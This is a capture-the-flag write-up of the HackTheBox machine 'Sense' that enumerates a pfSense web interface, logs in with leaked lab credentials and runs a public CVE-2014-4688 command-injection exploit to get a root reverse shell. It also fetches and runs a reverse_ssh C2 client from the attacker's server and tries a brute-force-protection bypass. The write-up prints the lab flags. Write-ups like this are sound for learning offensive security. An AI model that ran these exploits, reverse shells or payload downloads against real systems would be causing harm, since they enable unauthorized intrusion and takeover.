---
render_with_liquid: false
title: HackTheBox Writeup  Sense
date: 2023-09-30 21:36:13 +1400
tags: [hackthebox, nmap, linux, nmap, autorecon, feroxbuster, pfsense, enum, discover-secrets, searchsploit, cve-2014-4688, oscp-like]
---



Sense, while not requiring many steps to complete, can be challenging for some as the proof of concept exploit that is publicly available is very unreliable. An alternate method using the same vulnerability is required to successfully gain access.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sense]
└─$ writehosts htb '10.129.161.53 sense.htb'
+---------+--------+---------------+-----------+
| PROFILE | STATUS |      IP       |  DOMAIN   |
+---------+--------+---------------+-----------+
| htb     | on     | 10.129.161.53 | sense.htb |
+---------+--------+---------------+-----------+
```

## Autorecon

```bash
sudo $(which autorecon) --dirbuster.threads 100 -vv 10.129.161.53 
```

## Nmap

```bash

# Nmap 7.94 scan initiated Sat Sep 30 21:36:13 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 80,443 sense.htb
Nmap scan report for sense.htb (10.129.161.53)
Host is up, received user-set (0.064s latency).
Scanned at 2023-09-30 21:36:13 CST for 21s

PORT    STATE SERVICE  REASON         VERSION
80/tcp  open  http     syn-ack ttl 63 lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://sense.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http syn-ack ttl 63 lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: 501
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: 082559A7867CF27ACAB7E9867A8B320F
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/organizationalUnitName=Organizational Unit Name (eg, section)/localityName=Somecity/emailAddress=Email Address
| Issuer: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/organizationalUnitName=Organizational Unit Name (eg, section)/localityName=Somecity/emailAddress=Email Address
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-10-14T19:21:35
| Not valid after:  2023-04-06T19:21:35
| MD5:   65f8:b00f:57d2:3468:2c52:0f44:8110:c622
| SHA-1: 4f7c:9a75:cb7f:70d3:8087:08cb:8c27:20dc:05f1:bb02
| -----BEGIN CERTIFICATE-----
| MIIEKDCCA5GgAwIBAgIJALChaIpiwz41MA0GCSqGSIb3DQEBCwUAMIG/MQswCQYD
...
| /cEYWHDndn9Gwaxn7JyffK5lUAPMPEDtudQb3cxrevP/iFZwefi2d5p3jFkDCcGI
| +Y0tZRIRzHWgQHa/
|_-----END CERTIFICATE-----
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sat Sep 30 21:36:34 2023 -- 1 IP address (1 host up) scanned in 20.93 seconds
```

## 80 - HTTP : PFSense Login


### Info

```ruby
https://sense.htb [200] [501] [lighttpd/1.4.35] [PHP,lighttpd:1.4.35] [45b9050944cc05e2cb93783fe67ad7a50ddcdf17]
```

![](/assets/obsidian/81d832358d73cd8fcdf6135e5d5a8436.png)

Find out it's `PFsense ` by googling the logo image

![](/assets/obsidian/cd11b1e007b1f33ac1f697e215157018.png)

### Directory

> This command was from **autorecon**'s suggested manual commands, takes about 10 minutes to finish

![](/assets/obsidian/601cde857a9c1a679950348818fa5588.png)

```bash
feroxbuster -t 150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -r -o ferox_443.txt -u https://10.129.63.128
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sense]
└─$ cat ferox_443.txt
200      GET        7l       24w     1543c https://10.129.63.128/themes/pfsense_ng/images/icons/favicon.ico
200      GET        7l       48w     1996c https://10.129.63.128/themes/pfsense_ng/images/icons/icon_exclam.gif
200      GET      174l      262w     4512c https://10.129.63.128/themes/pfsense_ng/javascript/niftyjsCode.js
200      GET      179l      756w     7017c https://10.129.63.128/csrf/csrf-magic.js
200      GET       33l      203w    10330c https://10.129.63.128/themes/pfsense_ng/images/misc/loader.gif
200      GET      173l      425w     6690c https://10.129.63.128/index.php
200      GET     1127l     2423w    21297c https://10.129.63.128/themes/pfsense_ng/login.css
200      GET      173l      425w     6689c https://10.129.63.128/help.php
200      GET      155l     1122w    95394c https://10.129.63.128/fred.png
200      GET     8981l    35772w   236203c https://10.129.63.128/javascript/jquery.js
200      GET      173l      425w     6690c https://10.129.63.128/
200      GET      173l      425w     6690c https://10.129.63.128/stats.php
200      GET      173l      425w     6689c https://10.129.63.128/edit.php
200      GET      173l      425w     6691c https://10.129.63.128/system.php
200      GET      173l      425w     6691c https://10.129.63.128/status.php
200      GET       24l       32w      329c https://10.129.63.128/index.html
200      GET       10l       40w      271c https://10.129.63.128/changelog.txt
200      GET      173l      425w     6689c https://10.129.63.128/exec.php
200      GET      173l      425w     6690c https://10.129.63.128/graph.php
200      GET      136l      329w     2338c https://10.129.63.128/tree/tree.css
200      GET      195l      596w     4923c https://10.129.63.128/tree/tree.js
200      GET      228l      851w     7492c https://10.129.63.128/tree/
200      GET      173l      425w     6691c https://10.129.63.128/wizard.php
200      GET      173l      425w     6688c https://10.129.63.128/pkg.php
200      GET      173l      404w     6113c https://10.129.63.128/installer/installer.php
200      GET       17l       26w      384c https://10.129.63.128/xmlrpc.php
200      GET      173l      425w     6691c https://10.129.63.128/reboot.php
200      GET      173l      425w     6695c https://10.129.63.128/interfaces.php
200      GET        7l       12w      106c https://10.129.63.128/system-users.txt
```


# User Flag
---


# Root Flag
---

## Enumeration

> If I bind the host IP to a custom host, it will show this error
{: .prompt-warning }

![](/assets/obsidian/82ef9e6e2f69f0db665d31b077817771.png)

> No useful info from the certificate, just anonymous info
{: .prompt-tip }

![](/assets/obsidian/535bb2005d2dee73688423c1256979e3.png)

> It says `2/3` vulnerabilities was patched, so there might be one available to exploit
{: .prompt-warning }

> https://10.129.161.53/changelog.txt

![](/assets/obsidian/a1ff48a4e108ef9dc0e78c2ae0612760.png)


## Got banned for 24 hours due to brute force attack

![](/assets/obsidian/49c3833015baa5a3d31deebfb186cccc.png)

Makes **sense** since this is a machine with **pfsense** firewall

> it's a good practice because this could happen in real red team engagement


## Login to pfsense admin dashboard

> https://10.129.161.53/

Tried `admin`:`admin`, `admin`:`password`

Tried default password : `admin`:`pfsense`

![](/assets/obsidian/2704ee036391ebbf6afc50a0a7cc1b13.png)

Wouldn't get this **url** if not using **autorecon**

> https://10.129.161.53/system-users.txt

![](/assets/obsidian/18ca9afd406751a3aa108be56ed068cc.png)

> Logged in successful with `rohit`:`pfsense` (Username needs to be lowercase)
{: .prompt-tip }

![](/assets/obsidian/504a951b41221611357d03cbbc272f73.png)


## Command Injection in pfsense 2.1.3 (CVE-2014-4688)

Got version info

![](/assets/obsidian/b435f5f831baa61b6d2e9493b996183f.png)

```bash
searchsploit pfsense 2.1.3
```

![](/assets/obsidian/a1ceff1751b599911a7f08dbdf7e1ef0.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sense]
└─$ searchsploit -m 43560
  Exploit: pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection
      URL: https://www.exploit-db.com/exploits/43560
     Path: /usr/share/exploitdb/exploits/php/webapps/43560.py
    Codes: CVE-2014-4688
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/htb/Sense/43560.py

┌──(bravosec㉿fsociety)-[~/htb/Sense]
└─$ vi 43560.py
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sense]
└─$ python 43560.py --rhost 10.129.161.53 --lhost 10.10.16.13 --lport 1111 --username rohit --password pfsense
CSRF token obtained
Running exploit...
```

Wow instant root

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sense]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.13] from (UNKNOWN) [10.129.161.53] 11717
sh: can't access tty; job control turned off

# id
uid=0(root) gid=0(wheel) groups=0(wheel)

#
```

```bash

# cat /root/root.txt
d08c32a5d4f8c8b10e76eb51a69f1a86

# ls -la /home
total 16
drwxr-xr-x   4 root   wheel     512 Oct 14  2017 .
drwxr-xr-x  26 root   wheel     512 Oct 14  2017 ..
drwxrwxr-x   2 root   operator  512 Oct 14  2017 .snap
drwxr-xr-x   2 rohit  nobody    512 Oct 14  2017 rohit

# cat /home/rohit/user.txt
8721327cc232073b40d27d9c17e7348b#
```

# Additional
---

## Learnt

- Always run **autorecon** as a routine to not miss something
- Run commands from `/results/$IP/scans/_manual_commands.txt` when common enumeration didn't work well
- Always try usernames and passwords in lowercase


## Failed Attempts


### Getting a tty

Struggled a bit at getting a `tty`... Things can get weird on **OpenBSD**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sense]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.13] from (UNKNOWN) [10.129.161.53] 30618
sh: can't access tty; job control turned off

# script /dev/null -c bash
script: not found

# which script

# where script
where: not found

# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3: not found

# python -c 'import pty; pty.spawn("/bin/bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "/usr/pbi/open-vm-tools-nox11-amd64/lib/python2.7/pty.py", line 167, in spawn
    os.execlp(argv[0], *argv)
  File "/usr/pbi/open-vm-tools-nox11-amd64/lib/python2.7/os.py", line 327, in execlp
    execvp(file, args)
  File "/usr/pbi/open-vm-tools-nox11-amd64/lib/python2.7/os.py", line 344, in execvp
    _execvpe(file, args)
  File "/usr/pbi/open-vm-tools-nox11-amd64/lib/python2.7/os.py", line 368, in _execvpe
    func(file, *argrest)
OSError: [Errno 2] No such file or directory
```

The two main tricks failed, I can't even write ssh keys because it does not have ssh opened

And there was even no `wget` and `curl`, `nc` was a special one for openbsd system

I'll use the [python download trick from **gtfobins**](https://gtfobins.github.io/gtfobins/python/#file-download)

> **Filetransfer CheatSheet**
> > https://github.com/0xsyr0/OSCP#file-transfer
{: .prompt-tip }

Host **reverse_ssh** client

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sense/www]
└─$ ln -s /opt/sectools/c2/reverse_ssh/bin/client

┌──(bravosec㉿fsociety)-[~/htb/Sense/www]
└─$ python -m http.server 80
```

```bash
export URL=http://10.10.16.13/client
export LFILE=/tmp/client
python -c 'import sys; from os import environ as e;import urllib as r;r.urlretrieve(e["URL"], e["LFILE"])'
chmod +x /tmp/client
/tmp/client
```

Failed to execute

![](/assets/obsidian/0d72180e2ee3e59ee5a49b856c3d0a6d.png)

Another way is to spawn `/bin/sh`, but won't be able to tab auto complete

```bash
python -c 'import pty;pty.spawn(""/bin/sh")'
CTRL + Z
stty raw -echo; fg
export TERM=xterm
```


### pfsenseCE v2.6.0 - Anti-brute force protection bypass

Google : `pfsense brute force login`

> https://www.exploit-db.com/exploits/51352

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sense]
└─$ searchsploit -m 51352
  Exploit: pfsenseCE v2.6.0 - Anti-brute force protection bypass
      URL: https://www.exploit-db.com/exploits/51352
     Path: /usr/share/exploitdb/exploits/hardware/remote/51352.py
    Codes: CVE-2023-27100
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/htb/Sense/51352.py
```

![](/assets/obsidian/e538cc24eae03d1404d94f491a0ccf88.png)

Failed to bypass, still getting banned

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sense]
└─$ python 51352.py -l https://$(jq -r .rhosts .config.json)/ -u users.tst -p /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt
pfsenseCE <= 2.6.0 Anti-brute force protection bypass
```



